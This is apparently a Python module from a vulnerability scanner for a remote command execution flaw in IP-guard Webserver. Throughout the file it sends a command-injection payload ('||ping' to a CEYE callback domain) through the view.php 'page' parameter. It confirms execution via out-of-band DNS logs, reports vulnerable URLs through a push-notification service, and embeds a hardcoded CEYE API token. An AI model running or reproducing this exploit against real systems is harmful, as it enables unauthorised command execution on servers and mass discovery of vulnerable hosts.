import time

import requests
from colorama import Fore

from Modules.Configure import ServerJ


class Basic_information:
    no = 107,
    bugName = "IP-guard Webserver view 远程命令执行漏洞"


def scan_IP_guard_Webserver_view_RemoteCommandExecution(url, proxies, append_to_output, serverJ_key, bugName):
    # 替换成您的CEYE API信息
    api_base_url = "http://api.ceye.io/v1"
    api_token = "394eb5e86394352a6270dc6a60dc7848"
    payload_id = "0uim95.ceye.io"

    # 构建API请求的参数
    params = {
        "token": api_token,
        "type": "dns",
        "filter": payload_id
    }

    # 构建API请求的URL
    request_url = f"{api_base_url}/records"

    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    if url.endswith("/"):
        path = f"ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&format=swf&isSplit=true&page=||ping%20{payload_id}"
    else:
        path = f"/ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&format=swf&isSplit=true&page=||ping%20{payload_id}"
    encodetext = url + path

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate, br",
    }
    try:
        response_ceye = requests.get(request_url, params=params, verify=False, proxies=None)
        if response_ceye.status_code == 200:
            data = response_ceye.json()
            records = data.get("data", [])
            id_count = len(records)

            if id_count > 0:
                append_to_output(f"[-] CEYE收到请求记录，共收到 {id_count} 个id属性记录。", "yellow")
                append_to_output("[!] 请求记录列表：", "yellow")
                for record in records:
                    append_to_output(str(record), "yellow")
            else:
                append_to_output("[-] CEYE没有收到请求记录。", "yellow")

        else:
            append_to_output("[-] API请求失败。HTTP状态码：", response_ceye.status_code)

        start_time = time.time()
        response = requests.get(encodetext, headers=headers, verify=False, timeout=10, proxies=proxies)
        end_time = time.time()
        response_time = end_time - start_time
        if response.status_code == 200 and 2 < response_time < 6:
            append_to_output(
                Fore.GREEN + f"[+] {url} 可能存在{bugName}，等待ceyelog日志确认！！！！",
                "red")
            append_to_output(response.text, "yellow")

            response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=proxies)
            if response_ceye.status_code == 200:
                data = response_ceye.json()
                records = data.get("data", [])
                id_count_change = len(records)

                if id_count_change > id_count:
                    append_to_output(
                        f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞", "red")
                    append_to_output("请求记录列表：", "yellow")
                    for record in records:
                        append_to_output(str(record), "yellow")
                else:
                    append_to_output(f"[-] CEYE没有收到请求记录，误报。", "green")

            else:
                append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
        elif response.status_code == 200:
            response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=None)
            if response_ceye.status_code == 200:
                data = response_ceye.json()
                records = data.get("data", [])
                id_count_change = len(records)

                if id_count_change > id_count:
                    append_to_output(
                        f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞",
                        "red")
                    append_to_output("请求记录列表：", "yellow")
                    for record in records:
                        append_to_output(str(record), "yellow")
                else:
                    append_to_output(f"[-] CEYE没有收到请求记录，误报。", "green")

            else:
                append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
        else:
            append_to_output(Fore.RED + f"[-] {url} 不存在{bugName}", "green")
    except requests.Timeout:
        append_to_output(f"[!] 请求超时，但是检测一下ceye是否有变化: {url}", "yellow")
        response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=None)
        if response_ceye.status_code == 200:
            data = response_ceye.json()
            records = data.get("data", [])
            id_count_change = len(records)

            if id_count_change > id_count:
                append_to_output(f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞",
                                 "red")
                append_to_output("[-] 请求记录列表：", "yellow")
                for record in records:
                    append_to_output(str(record), "yellow")
                append_to_output(f"[+] 确认 {url} 存在{bugName}", "red")
                ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)

            else:
                append_to_output("[-] CEYE没有收到请求记录，跳过这个URL。", "green")

        else:
            append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
    except Exception as e:
        append_to_output(str(e))
